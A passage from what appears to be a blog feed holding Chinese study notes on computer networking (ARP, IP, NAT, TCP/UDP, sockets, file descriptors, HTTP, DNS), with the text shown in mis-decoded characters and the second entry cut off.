ç”¨äºåˆ¤æ–­IPåœ°å€ä¸­é‚£ä¸€éƒ¨åˆ†è¡¨ç¤ºå­ç½‘ï¼Œå³ç½‘ç»œå·ï¼Œé‚£ä¸€éƒ¨åˆ†è¡¨ç¤ºä¸»æœºå·ã€‚<br>ç½‘ç»œå·æ˜¯å¤šä¸ªä¸»æœºå…±æœ‰çš„ã€ç›¸åŒçš„ã€‚</p><h2 id="é»˜è®¤ç½‘å…³"><a href="#é»˜è®¤ç½‘å…³" class="headerlink" title="é»˜è®¤ç½‘å…³"></a>é»˜è®¤ç½‘å…³</h2><p>é»˜è®¤ç½‘å…³ä¹Ÿæ˜¯ä¸€ä¸ªIPåœ°å€ã€‚<br>åœ¨ä¸»æœºå‘é€ç»™ä¸åŒå­ç½‘çš„ä¸»æœºæ—¶ï¼Œå°±å‘é€ç»™é»˜è®¤ç½‘å…³ã€‚</p><p>æ‰€ä»¥è¯´ï¼Œè·¯ç”±å™¨åœ¨äº¤æ¢æœºé¢å‰å°±æ˜¯ä¸€ä¸ªæœ‰IPåœ°å€ã€MACåœ°å€çš„ä¸€ä¸ªä¸»æœºã€‚</p><p>è·¯ç”±å™¨ä¸­æœ‰è·¯ç”±è¡¨ï¼Œè®°å½•å­ç½‘å·ã€‚</p><h2 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a>ARPåè®®</h2><p>é€šè¿‡IPåœ°å€ï¼Œæ‰¾åˆ°MACåœ°å€ã€‚ç”µè„‘ä¸­æœ‰ARPç¼“å­˜è¡¨ã€‚<br>æ•°æ®ä¿¡æ¯æœ€ç»ˆæ˜¯é€šè¿‡MACåœ°å€åˆ°è¾¾ã€‚</p><h2 id="æ•°æ®ä¼ è¾“çš„è¿‡ç¨‹"><a href="#æ•°æ®ä¼ è¾“çš„è¿‡ç¨‹" class="headerlink" title="æ•°æ®ä¼ è¾“çš„è¿‡ç¨‹"></a>æ•°æ®ä¼ è¾“çš„è¿‡ç¨‹</h2><p>è¿‡ç¨‹ä¸­ï¼Œæ•°æ®åŒ…ä¸­IPåœ°å€ä¸å˜ï¼ŒMACåœ°å€åœ¨å˜åŒ–ã€‚<br>æ•°æ®é“¾è·¯å±‚è®°å½•MACåœ°å€ï¼Œç½‘ç»œå±‚è®°å½•IPåœ°å€ã€‚<br>äº¤æ¢æœºåªå¤„ç†MACåœ°å€ã€‚</p><p>è·¯ç”±å™¨è·¯ç”±è¡¨ä¸­ï¼Œè‹¥åŒ¹é…ä¸Šäº†å“ä¸€è·³ï¼Œå³æ˜¯å‘ç»™ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ã€‚<br>å‘ç»™äº¤æ¢æœºçš„æ•°æ®ä¸­ï¼Œå¿…é¡»åŒ…å«MACåœ°å€ã€‚</p><h1 id="æœ€ç»ˆæ¢³ç†ï¼Œéƒ¨åˆ†çŸ¥è¯†ç‚¹"><a href="#æœ€ç»ˆæ¢³ç†ï¼Œéƒ¨åˆ†çŸ¥è¯†ç‚¹" class="headerlink" title="æœ€ç»ˆæ¢³ç†ï¼Œéƒ¨åˆ†çŸ¥è¯†ç‚¹"></a>æœ€ç»ˆæ¢³ç†ï¼Œéƒ¨åˆ†çŸ¥è¯†ç‚¹</h1><p>å«æœ‰APRè¡¨çš„ä¸ºä¸»æœºå’Œè·¯ç”±å™¨ï¼ŒAPRè¡¨è®°å½•IPåœ°å€å’ŒMACåœ°å€çš„å¯¹åº”å…³ç³»ã€‚<br>äº¤æ¢æœºä¸­æœ‰MACåœ°å€è¡¨ï¼Œèƒ½å¤Ÿå­¦ä¹ ï¼Œè®°å½•MACåœ°å€å’Œç«¯å£çš„å¯¹åº”å…³ç³»ã€‚<br>è·¯ç”±å™¨ä¸­è¿˜æœ‰è·¯ç”±è¡¨ï¼Œè®°å½•å­ç½‘å’Œç«¯å£çš„å…³ç³»ï¼Œé€šè¿‡ä¸‹ä¸€è·³è¡¨é¡¹å†³å®šæ˜¯å¦ä¼ ç»™ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ã€‚</p><h2 id="æ•°æ®åŒ…é¦–éƒ¨"><a href="#æ•°æ®åŒ…é¦–éƒ¨" class="headerlink" title="æ•°æ®åŒ…é¦–éƒ¨"></a>æ•°æ®åŒ…é¦–éƒ¨</h2><p>æ¯ä¸ªåˆ†å±‚ï¼Œéƒ½ä¼šå¯¹æ‰€å‘é€çš„æ•°æ®é™„åŠ ä¸€ä¸ªé¦–éƒ¨ã€‚<br>æ•°æ®åŒ…éƒ½æ˜¯ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†æ˜¯é¦–éƒ¨ï¼Œä¸€éƒ¨åˆ†æ˜¯æ•°æ®ã€‚</p><p>æ¯ä¸ªåŒ…é¦–éƒ¨éƒ½è‡³å°‘åŒ…å«ä¸¤ä¸ªä¿¡æ¯ï¼š</p><ul><li>å‘é€ç«¯å’Œæ¥å—ç«¯çš„åœ°å€ã€‚</li><li>ä¸Šä¸€å±‚çš„åè®®ç±»å‹ã€‚</li></ul><p>æ¯ä¸ªåˆ†å±‚åŒ…é¦–éƒ¨ä¸­è¿˜åŒ…å«ä¸€ä¸ªè¯†åˆ«ä½ï¼Œç”¨æ¥è¡¨ç¤ºä¸Šä¸€å±‚åè®®çš„ç§ç±»ä¿¡æ¯ã€‚</p><p>æ¯ä¸€ç§åè®®å¯¹åº”ä¸€ç§å¤„ç†ç¨‹åºã€‚</p><h2 id="ä»¥å¤ªç½‘-1"><a href="#ä»¥å¤ªç½‘-1" class="headerlink" title="ä»¥å¤ªç½‘"></a>ä»¥å¤ªç½‘</h2><p>Ethernetä¸€è¯æºäºEther(ä»¥å¤ª)ï¼Œæ„ä¸ºä»‹è´¨ã€‚<br>ä»¥å¤ªç½‘çš„å‘å±•å¯ä»¥çœ‹æˆç”µç¼†çš„æ”¹å˜ã€‚</p><h3 id="ä»¥å¤ªå¸§"><a href="#ä»¥å¤ªå¸§" class="headerlink" title="ä»¥å¤ªå¸§"></a>ä»¥å¤ªå¸§</h3><p>å‰ç«¯æœ‰å…«ä¸ªå­—èŠ‚çš„å‰å¯¼ç ï¼Œæœ¬ä½“é¦–éƒ¨åå››ä¸ªå­—èŠ‚ï¼Œå¸§å°¾æœ‰FCSï¼Œå››ä¸ªå­—èŠ‚ï¼Œæ£€éªŒå¸§æ˜¯å¦æŸåï¼Œé€šè¿‡è®¡ç®—ä½™æ•°ã€‚</p><h2 id="Wi-Fi"><a href="#Wi-Fi" class="headerlink" title="Wi-Fi"></a>Wi-Fi</h2><p>Wireless Fidelityï¼ŒæŒ‡é«˜è´¨é‡çš„æ— é™LANã€‚</p><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>Virtual Private Networkè™šæ‹Ÿä¸“ç”¨ç½‘ç»œã€‚</p><h2 id="æ•°æ®é“¾è·¯"><a href="#æ•°æ®é“¾è·¯" class="headerlink" title="æ•°æ®é“¾è·¯"></a>æ•°æ®é“¾è·¯</h2><p>å°±æ˜¯æ•°æ®ä¼ è¾“æ–¹å¼ï¼Œå¦‚ä»¥å¤ªç½‘ã€æ— çº¿ç­‰ï¼Œå¯¹åº”ä¸åŒçš„é€šä¿¡åª’ä»‹ã€‚</p><h2 id="ç½‘ç»œå±‚ä¸æ•°æ®é“¾è·¯å±‚çš„å…³ç³»"><a href="#ç½‘ç»œå±‚ä¸æ•°æ®é“¾è·¯å±‚çš„å…³ç³»" class="headerlink" title="ç½‘ç»œå±‚ä¸æ•°æ®é“¾è·¯å±‚çš„å…³ç³»"></a>ç½‘ç»œå±‚ä¸æ•°æ®é“¾è·¯å±‚çš„å…³ç³»</h2><p>æ•°æ®é“¾è·¯å±‚è´Ÿè´£ç›´è¿çš„ä¸¤ä¸ªè®¾å¤‡ä¹‹é—´çš„é€šä¿¡ï¼Œç½‘ç»œå±‚è´Ÿè´£æ²¡æœ‰ç›´è¿çš„ä¸¤ä¸ªç½‘ç»œä¹‹é—´çš„é€šä¿¡ã€‚</p><p>ä¸åŒç½‘ç»œåŒºé—´çš„æ•°æ®ä¼ é€’ç§°è·³hopï¼Œä¸‹ä¸€è·³ï¼Œå³æŒ‡å®šä¸‹ä¸€ä¸ªè·¯ç”±å™¨æˆ–ä¸»æœºçš„ä½ç½®ã€‚IPåœ°å€ï¼Œæ¯”MACåœ°å€æ›´æ˜“ç»„ç»‡ã€‚<br>ä¸åŒæ•°æ®é“¾è·¯â€”-ä¸åŒä»‹è´¨â€”-ä¸åŒä¼ è¾“é€Ÿç‡ã€‚</p><p>IPé¢å‘æ— è¿æ¥ï¼Œç®€å•ã€é«˜é€ŸåŒ–ã€‚<br>IPè´Ÿè´£å‘é€ï¼ŒTCPè´Ÿè´£ä¿è¯ä¸»æœºç¡®å®æ”¶åˆ°æ•°æ®ã€‚<br>åŒä¸€ç½‘æ®µï¼Œå³IPåœ°å€ä¸­çš„ç½‘ç»œå·ç›¸åŒã€‚</p><h1 id="IPåœ°å€"><a href="#IPåœ°å€" class="headerlink" title="IPåœ°å€"></a>IPåœ°å€</h1><p>ABCDå››ç±»åœ°å€å¯¹åº”å¤šç§åŠŸèƒ½ã€‚<br>æœ‰äº†å­ç½‘æ©ç ä»¥åï¼Œå°±æ²¡æœ‰ABCDçš„IPåœ°å€åˆ†ç±»äº†ã€‚</p><p>æ•°æ®é“¾è·¯ä¸åŒï¼Œå¯¹åº”çš„MTU(æœ€å¤§ä¼ è¾“å•å…ƒ)ä¸åŒï¼Œå› ä¸ºå…¶ä¼ è¾“ç”¨é€”ä¸åŒã€‚</p><p>é¢å¯¹ç½‘ç»œè¿‡æ»¤æ˜¯å¦å¯æ¨¡æ‹Ÿå‚æ•°ã€‚</p><p>åˆ†ç‰‡çš„åå¤„ï¼Œä¸€å—ç¢ç‰‡ä¸¢å¤±ä¼šå¯¼è‡´æ•´ä¸ªæ•°æ®ä½œåºŸ.</p><p>TTL(Time To Live)ç”Ÿå­˜å‘¨æœŸã€‚</p><h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><p>è§£å†³äº†ç§»åŠ¨é€šä¿¡æ—¶çš„IPåˆ†é…é—®é¢˜ã€‚<br>é¿å…é‡å¤åˆ†é…ï¼Œå‘é€ICMPå›é€è¯·æ±‚åŒ…ã€‚</p><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>Network Address Translator,è§£å†³IPv4åœ°å€æ¯ç«­é—®é¢˜ï¼Œä»¥åŠIPv6çš„å®‰å…¨é—®é¢˜ã€‚<br>ç§æœ‰IPåœ°å€å’Œå…¨å±€IPåœ°å€çš„è½¬æ¢ã€‚<br>NAT-PT(Protocol Translation)</p><p>IPä»»æ’­ï¼ŒæŒ‡ä¸ºæä¾›åŒä¸€ç§æœåŠ¡çš„æœåŠ¡å™¨é…ç½®åŒä¸€ä¸ªIPåœ°å€ã€‚</p><p>è·¯ç”±å™¨æœ‰å¯¹æŸäº›åŒ…ä¼˜å…ˆå¤„ç†çš„æ–¹å¼ã€‚</p><h2 id="åŒ…ä¸­çš„å„ä¸ªæ ‡è®°"><a href="#åŒ…ä¸­çš„å„ä¸ªæ ‡è®°" class="headerlink" title="åŒ…ä¸­çš„å„ä¸ªæ ‡è®°"></a>åŒ…ä¸­çš„å„ä¸ªæ ‡è®°</h2><p>æ¯ä¸€å±‚çš„æ ‡è¯†ï¼Œä¸Šä¸€å±‚çš„æ ‡è¯†ã€‚</p><h2 id="å®ˆæŠ¤è¿›ç¨‹"><a href="#å®ˆæŠ¤è¿›ç¨‹" class="headerlink" title="å®ˆæŠ¤è¿›ç¨‹"></a>å®ˆæŠ¤è¿›ç¨‹</h2><p>æœåŠ¡ç«¯çš„ç¨‹åºã€‚<br>é€šè¿‡ç›®çš„ç«¯å£å·å¯ä»¥è¯†åˆ«æ•°æ®åŒ…å‘é€ç»™å“ªä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ã€‚</p><h2 id="æµ"><a href="#æµ" class="headerlink" title="æµ"></a>æµ</h2><p>æŒ‡ä¸é—´æ–­çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥æƒ³è±¡æˆæ’æ°´ç®¡é“ä¸­çš„æ°´æµã€‚</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>ä½¿ç”¨TCPæ—¶ï¼Œå‘é€ç«¯çš„ä¿¡æ¯ä¸­å«æœ‰æ•°æ®æ®µçš„é•¿åº¦ä¿¡æ¯ã€‚</p><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>User Datagram Protocol,ç”¨æˆ·æ•°æ®æŠ¥åè®®ã€‚</p><p>TCPçš„ç‰¹å¾ï¼š</p><ul><li>é¢å‘è¿æ¥</li><li>å…·å¤‡é¡ºåºæ§åˆ¶ã€é‡å‘æœºåˆ¶ç­‰æœºåˆ¶</li></ul><p>UDPçš„é€‚ç”¨åŒºï¼š<br>é«˜é€Ÿä¼ è¾“å’Œå®æ—¶æ€§è¾ƒé«˜è¦æ±‚çš„é€šä¿¡æˆ–å¹¿æ’­é€šä¿¡ã€‚</p><h2 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h2><p>å³å¥—æ¥å­—ã€‚å¥—æ¥ï¼Œæ˜¯å»ºç«‹ç½‘ç»œé€šè®¯å’Œè¿›ç¨‹é—´é€šè®¯ï¼Œå­—ï¼Œæ˜¯å¯äº¤äº’çš„æœ‰åºæŒ‡ä»¤ä¸²ã€‚</p><p>socketåŸæ„æ˜¯ç‰©ç†ä¸Šçš„æ’åº§ï¼Œç”µå™¨çš„æ’å¤´æ’ä¸Šæ’åº§å°±ä¼šä»ç”µç½‘è·å–ç”µåŠ›ä¾›åº”ï¼Œè¿™é‡Œå¯ä¸ºé€»è¾‘ä¸Šçš„ï¼Œæ¯”å¦‚webå’Œæµè§ˆå™¨å¯è§†ä¸ºsocketã€‚</p><p>socketå¯èƒ½ç”¨äºåˆ›å»ºè¿æ¥ã€‚</p><h2 id="æ–‡ä»¶æè¿°ç¬¦"><a href="#æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ–‡ä»¶æè¿°ç¬¦"></a>æ–‡ä»¶æè¿°ç¬¦</h2><p>fdï¼Œfile descriptor, ä¸ºäº†è¡¨ç¤ºå’ŒåŒºåˆ†å·²ç»æ‰“å¼€çš„æ–‡ä»¶ï¼ŒUNIX&#x2F;Linuxç»™æ¯ä¸ªæ–‡ä»¶åˆ†é…çš„IDï¼Œé€šå¸¸ï¼š</p><ul><li>ç”¨0è¡¨ç¤ºæ ‡å‡†è¾“å…¥æ–‡ä»¶(stdin)ï¼Œå¯¹åº”ç¡¬ä»¶è®¾å¤‡çš„é”®ç›˜</li><li>ç”¨1è¡¨ç¤ºæ ‡å‡†è¾“å‡ºæ–‡ä»¶(stdout),å¯¹åº”ç¡¬ä»¶è®¾å¤‡çš„æ˜¾ç¤ºå™¨</li><li>ç”¨2è¡¨ç¤ºæ ‡å‡†é”™è¯¯è¾“å‡ºæ–‡ä»¶(stderr)</li></ul><p>ç³»ç»Ÿåˆ›å»ºçš„æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šé»˜è®¤æ‰“å¼€è¿™ä¸‰ä¸ªæ–‡ä»¶ã€‚</p><p>UNIX&#x2F;Linuxæ‰§è¡Œçš„ä»»ä½•I&#x2F;Oæ“ä½œéƒ½æ˜¯åœ¨è¯»å–æˆ–å†™å…¥æ–‡ä»¶æè¿°ç¬¦â€”-ä¸€ä¸ªæ•´æ•°ï¼Œå…³è”ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶ã€‚</p><p>ç½‘ç»œè¿æ¥ä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚</p><p>æ¯ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ä¸æ˜¯å›ºå®šçš„ã€‚<br>æ–‡ä»¶æè¿°ç¬¦ä¹Ÿä¸æ˜¯é€’å¢çš„ï¼Œå…¶è¢«å›æ”¶åå¯è¢«é‡æ–°åˆ†é…ã€‚</p><p>æ¯ä¸ªè¿›ç¨‹éƒ½ç»´æŠ¤ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„é›†åˆã€‚<br>æ–°çš„æ–‡ä»¶æè¿°ç¬¦ä»3å¼€å§‹åˆ†é…ã€‚</p><p>æ€»ç»“ï¼š<br>    1.æ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸€ä¸ªæ•´å‹<br>    2.æ¯ä¸ªè¿›ç¨‹é»˜è®¤æ‰“å¼€0ã€1ã€2ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæ–°çš„æ–‡ä»¶æè¿°ç¬¦éƒ½æ˜¯ä»3å¼€å§‹åˆ†é…<br>    3.ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦è¢«å›æ”¶åå¯ä»¥å†æ¬¡è¢«åˆ†é…<br>    4.æ¯ä¸ªè¿›ç¨‹å•ç‹¬ç»´æŠ¤ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„é›†åˆ </p><h2 id="forkå‡½æ•°"><a href="#forkå‡½æ•°" class="headerlink" title="forkå‡½æ•°"></a>forkå‡½æ•°</h2><p>ç”¨äºåˆ›å»ºè¿›ç¨‹ï¼Œå…¶è¿”å›ä¸€ä¸ªintå€¼ï¼Œå½“è¿”å›å€¼ä¸º0æ—¶è¡¨æ˜å½“å‰æ˜¯å­è¿›ç¨‹æ­£åœ¨æ‰§è¡Œï¼Œé0å°±ä¸ºçˆ¶è¿›ç¨‹åœ¨æ‰§è¡Œã€‚</p><h2 id="ç«¯å£å·"><a href="#ç«¯å£å·" class="headerlink" title="ç«¯å£å·"></a>ç«¯å£å·</h2><p>å‡ ä¸ªåœ°å€ï¼š</p><ul><li>MACåœ°å€ï¼Œå¯¹åº”æ•°æ®é“¾è·¯å±‚çš„åœ°å€</li><li>IPåœ°å€ï¼Œå¯¹åº”ç½‘ç»œå±‚çš„åœ°å€</li><li>ç«¯å£å·ï¼Œå¯¹åº”ä¼ è¾“å±‚çš„åœ°å€</li></ul><p>ç”¨äºè¯†åˆ«åŒä¸€å°è®¡ç®—æœºä¸­è¿›è¡Œé€šä¿¡çš„ä¸åŒåº”ç”¨ç¨‹åºï¼Œå› æ­¤ï¼Œä¹Ÿå«ç¨‹åºåœ°å€ã€‚</p><p>TCP&#x2F;IPæˆ–UDP&#x2F;IPé€šä¿¡ä¸­é‡‡ç”¨çš„äº”ä¸ªä¿¡æ¯è¯†åˆ«ï¼š</p><ul><li>æºIPåœ°å€</li><li>ç›®æ ‡IPåœ°å€</li><li>åè®®å·</li><li>æºç«¯å£å·</li><li>ç›®æ ‡ç«¯å£å·</li></ul><p>ç«¯å£å·å¯åŠ¨æ€åˆ†é…å’Œé™æ€åˆ†é…ã€‚<br>ä¸åŒçš„ä¼ è¾“åè®®å¯ä»¥ä½¿ç”¨ä¸åŒçš„ç«¯å£å·ã€‚</p><h2 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h2><p>æŒ‡å„ç§è®¾å¤‡ã€çº¿è·¯ï¼Œæˆ–ç½‘ç»œä¸­è¿›è¡Œé€šä¿¡çš„ä¸¤ä¸ªåº”ç”¨ç¨‹åºä¸ºäº†ç›¸äº’ä¼ é€’æ¶ˆæ¯è€Œä¸“æœ‰çš„ã€è™šæ‹Ÿçš„é€šä¿¡çº¿è·¯ï¼Œä¹Ÿå«åšè™šæ‹Ÿç”µè·¯ã€‚</p><h2 id="çª—å£æ§åˆ¶å’Œé‡å‘æ§åˆ¶çš„ç†è§£"><a href="#çª—å£æ§åˆ¶å’Œé‡å‘æ§åˆ¶çš„ç†è§£" class="headerlink" title="çª—å£æ§åˆ¶å’Œé‡å‘æ§åˆ¶çš„ç†è§£"></a>çª—å£æ§åˆ¶å’Œé‡å‘æ§åˆ¶çš„ç†è§£</h2><p>é€šè¿‡ç¡®è®¤åº”ç­”æ¥å†³å®šé‡å‘å“ªä¸€éƒ¨åˆ†æ•°æ®ã€‚æ¯”å¦‚çª—å£å¤§å°ä¸º400å­—èŠ‚ï¼Œä¸€æ®µä¸ºä¸€ç™¾å­—èŠ‚ã€‚</p><p>0~100å­—èŠ‚å‘é€åï¼Œè¿˜æœªæ”¶åˆ°ç¡®è®¤åº”ç­”ï¼Œå¯ç»§ç»­å‘é€ã€‚æ­¤æ—¶å‘é€äº†101ï½200çš„å­—èŠ‚ã€‚</p><p>è¿™æ—¶ï¼Œå¯èƒ½æ”¶åˆ°äº†0ï½100çš„ç¡®è®¤åº”ç­”ï¼Œè¿™ä¸ªæ—¶å€™è¡¨æ˜0ï½100å­—èŠ‚çš„æ•°æ®å·²åˆ°è¾¾ã€‚</p><p>è‹¥æ²¡æ”¶åˆ°0ï½100çš„ç¡®è®¤åº”ç­”ï¼Œæ­¤æ—¶çš„åŸå› æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯æ•°æ®ä¸¢å¤±ï¼Œè€Œæ˜¯ç¡®è®¤åº”ç­”ä¸¢å¤±ã€‚</p><p>å…ˆè¯´ç¬¬ä¸€ç§ï¼Œæ•°æ®ä¸¢å¤±åï¼Œç”±äºå‘å‡ºäº†101ï½200çš„æ•°æ®ï¼Œä¹Ÿä¼šäº§ç”Ÿä¸€ä¸ªç¡®è®¤åº”ç­”ï¼Œè‹¥è¿™ä¸ªç¡®è®¤åº”ç­”æˆåŠŸè¿”å›ï¼Œå®ƒä¼šè¯·æ±‚0ï½100çš„æ•°æ®ï¼Œç„¶å0ï½100çš„æ•°æ®å°±ä¼šé‡å‘ã€‚</p><p>ç¬¬äºŒç§ï¼Œç¡®è®¤åº”ç­”ä¸¢å¤±ï¼Œé€šè¿‡å¯¹ç¬¬äºŒä¸ªç¡®è®¤åº”ç­”çš„åˆ¤æ–­ï¼Œè‹¥æ˜¯è¯·æ±‚201ï½300çš„æ•°æ®ï¼Œè¯´æ˜å‰ä¸¤ä¸ªæ•°æ®æ®µéƒ½å·²åˆ°è¾¾ã€‚</p><p>å› æ­¤ï¼Œçª—å£æ§åˆ¶å’Œé‡å‘æ§åˆ¶çš„æ ¸å¿ƒå°±æ˜¯ï¼Œé€šè¿‡åé¢çš„åº”ç­”åˆ¤æ–­å‰é¢çš„ä¼ è¾“æƒ…å†µã€‚</p><h2 id="äº’è”ç½‘çš„ç»“æ„"><a href="#äº’è”ç½‘çš„ç»“æ„" class="headerlink" title="äº’è”ç½‘çš„ç»“æ„"></a>äº’è”ç½‘çš„ç»“æ„</h2><p>ç½‘ç»œä¹‹é—´ç”±NOC(Network Operate Center)è¿æ¥ã€‚</p><p>å¼‚æ„ç½‘ç»œä¹‹é—´ç”±IX(Internet Exchange)è¿æ¥ã€‚</p><p>è¿æ¥äº’è”ç½‘éœ€è¦å‘ISP(Internet Service Provider)æˆ–åŒºåŸŸç½‘æäº¤ç”³è¯·ã€‚</p><h2 id="è¿œç¨‹ç™»å½•"><a href="#è¿œç¨‹ç™»å½•" class="headerlink" title="è¿œç¨‹ç™»å½•"></a>è¿œç¨‹ç™»å½•</h2><p>ä¸ºäº†å®ç°TSS(Time Sharing System)<br>SSH(Secure SHell)åè®®</p><p>NVT(Network Virtual Terminal)ä»¿çœŸç»ˆç«¯.</p><h2 id="åŸŸå"><a href="#åŸŸå" class="headerlink" title="åŸŸå"></a>åŸŸå</h2><p>åˆ†å±‚ã€‚</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>å«æœ‰MX(Mail Exchange)è®°å½•,å…¶è®°å½•æœ‰é‚®ä»¶åœ°å€åŠå…¶ä½œä¸ºå‘é€åœ°å€æ—¶å¯¹åº”çš„é‚®ä»¶æœåŠ¡å™¨çš„åŸŸåã€‚</p><h2 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h2><p>Uniform Resources Identifier.å¹¿ä¹‰æ¦‚å¿µ<br>URL(Uniform Resources Locator).ç‹­ä¹‰æ¦‚å¿µ</p><p>URIå¯ç”¨äºwwwä»¥å¤–çš„åè®®ã€‚</p><h2 id="URIçš„httpæ–¹æ¡ˆçš„å…·ä½“æ ¼å¼"><a href="#URIçš„httpæ–¹æ¡ˆçš„å…·ä½“æ ¼å¼" class="headerlink" title="URIçš„httpæ–¹æ¡ˆçš„å…·ä½“æ ¼å¼"></a>URIçš„httpæ–¹æ¡ˆçš„å…·ä½“æ ¼å¼</h2><p>http:&#x2F;&#x2F;ä¸»æœºå&#x2F;è·¯å¾„<br>http:&#x2F;&#x2F;ä¸»æœºå:ç«¯å£å·&#x2F;è·¯å¾„<br>http:&#x2F;&#x2F;ä¸»æœºå:ç«¯å£å·&#x2F;è·¯å¾„?è®¿é—®å†…å®¹#éƒ¨åˆ†ä¿¡æ¯ã€‚</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>ç”¨äºä¿å­˜ç™»å½•ä¿¡æ¯æˆ–ç½‘ç»œè´­ç‰©ä¸­æ”¾å…¥è´­ç‰©è½¦çš„å•†å“ä¿¡æ¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„</title>
    <link href="/2022/08/25/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84/"/>
    <url>/2022/08/25/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84/</url>
    
    <content type="html"><![CDATA[<h2 id="åè®®æ ˆ"><a href="#åè®®æ ˆ" class="headerlink" title="åè®®æ ˆ"></a>åè®®æ ˆ</h2><p>ç½‘ç»œæ§åˆ¶è½¯ä»¶ã€‚</p><h2 id="ç½‘å¡"><a href="#ç½‘å¡" class="headerlink" title="ç½‘å¡"></a>ç½‘å¡</h2><p>å°†åŒ…è½¬æ¢ä¸ºç”µä¿¡å·å¹¶é€šè¿‡ç½‘çº¿å‘é€å‡ºå»ã€‚</p><h2 id="www"><a href="#www" class="headerlink" title="www"></a>www</h2><p>wwwåªæ˜¯WebæœåŠ¡å™¨ä¸Šçš„ä¸€ç§å‘½åã€‚</p><p>World Wide Webä¸æ˜¯ä¸€ä¸ªåè®®çš„åå­—ï¼Œè€Œæ˜¯Webçš„æå‡ºè€…æœ€æ—©å¼€å‘çš„æµè§ˆå™¨å…¼HTMLç¼–è¾‘å™¨çš„åå­—</p><h2 id="URLæ ¼å¼"><a href="#URLæ ¼å¼" class="headerlink" title="URLæ ¼å¼"></a>URLæ ¼å¼</h2><p>å…¶ç”¨æˆ·åï¼Œå¯†ç ï¼Œç«¯å£å·å¯çœç•¥ã€‚</p><p><img src="/media/16511291377041.png"></p><p>é»˜è®¤æ–‡ä»¶ã€‚</p><h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><p>Common Gateway Interfaceå…¬å…±ç½‘å…³æ¥å£.</p><h2 id="HTTPè°“è¯"><a href="#HTTPè°“è¯" class="headerlink" title="HTTPè°“è¯"></a>HTTPè°“è¯</h2><p>ä¹Ÿå«HTTPåŠ¨è¯ï¼Œæ–¹æ³•ã€‚</p><p>è®¾ç½®ç½‘å¡æ˜¯ä¼šè®¾ç½®DNSåœ°å€ï¼Œå°±æ˜¯DNSæœåŠ¡å™¨çš„IPåœ°å€ã€‚</p><p>GETæ–¹æ³•èƒ½å¤Ÿå‘é€çš„æ•°æ®åªæœ‰å‡ ç™¾ä¸ªå­—èŠ‚ï¼Œå¦‚æœè¡¨å•ä¸­çš„æ•°æ®è¶…è¿‡è¿™ä¸€é•¿åº¦ï¼Œåˆ™å¿…é¡»ä½¿ç”¨POSTæ–¹æ³•æ¥å‘é€ã€‚</p><h2 id="è¯·æ±‚æ¶ˆæ¯"><a href="#è¯·æ±‚æ¶ˆæ¯" class="headerlink" title="è¯·æ±‚æ¶ˆæ¯"></a>è¯·æ±‚æ¶ˆæ¯</h2><p>æ ¼å¼ï¼š</p><ul><li>è¯·æ±‚è¡Œï¼Œå¯å¤§è‡´äº†è§£è¯·æ±‚å†…å®¹</li><li>æ¶ˆæ¯å¤´ï¼Œé™„åŠ ä¿¡æ¯</li><li>æ¶ˆæ¯ä½“ï¼Œæ•°æ®</li></ul><p>æ¶ˆæ¯å¤´ä¹‹åä¼šæœ‰ä¸€ä¸ªç©ºè¡Œã€‚</p><p>ä½¿ç”¨GETæ–¹æ³•æ—¶ï¼Œæ¶ˆæ¯ä½“ä¸­ä¸éœ€è¦æ•°æ®ã€‚</p><p>ä½¿ç”¨POSTæ–¹æ³•æ—¶ï¼Œéœ€è¦å°†è¡¨å•ä¸­å¡«å†™çš„ä¿¡æ¯å†™åœ¨æ¶ˆæ¯ä½“ä¸­ã€‚</p><h2 id="å“åº”æ¶ˆæ¯"><a href="#å“åº”æ¶ˆæ¯" class="headerlink" title="å“åº”æ¶ˆæ¯"></a>å“åº”æ¶ˆæ¯</h2><p>ç¬¬ä¸€è¡Œä¸ºçŠ¶æ€ç å’Œå“åº”çŸ­è¯­ã€‚</p><h2 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h2><p>æ¯ä¸ªURIæ 